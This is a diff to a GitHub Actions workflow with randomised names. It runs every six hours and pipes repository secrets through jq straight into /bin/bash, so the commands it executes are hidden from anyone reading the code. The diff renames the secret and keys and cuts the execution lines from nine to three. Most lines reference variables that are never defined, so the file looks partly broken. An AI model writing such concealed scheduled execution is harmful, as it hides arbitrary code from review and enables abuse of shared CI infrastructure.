@@ -1,8 +1,10 @@
 name: chenhejiu6189
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
+    - cron: '14 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +13,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: chenhejiu6189
         env:
-          lyjy44: ${{ secrets.lyjy44 }}
+          cgw94469: ${{ secrets.cgw94469 }}
         run: |
-          echo $lyjy44 | jq -r .hnnr98 | /bin/bash
-          echo $hes89 | jq -r .cwf57 | /bin/bash
-          echo $dfi69788 | jq -r .vws9 | /bin/bash
-          echo $bdmod7669 | jq -r .ui83415 | /bin/bash
-          echo $ffsrg7892 | jq -r .ceu0274 | /bin/bash
-          echo $coq178 | jq -r .p32240 | /bin/bash
-          echo $sgi8 | jq -r .qdtu9403 | /bin/bash
-          echo $lxw33989 | jq -r .f4 | /bin/bash
-          echo $hmi62270 | jq -r .ptqa79 | /bin/bash
+          echo $cgw94469 | jq -r .yz8 | /bin/bash
+          echo $bswdv53 | jq -r .o87668 | /bin/bash
+          echo $zw41183 | jq -r .vdhmr6 | /bin/bash
 
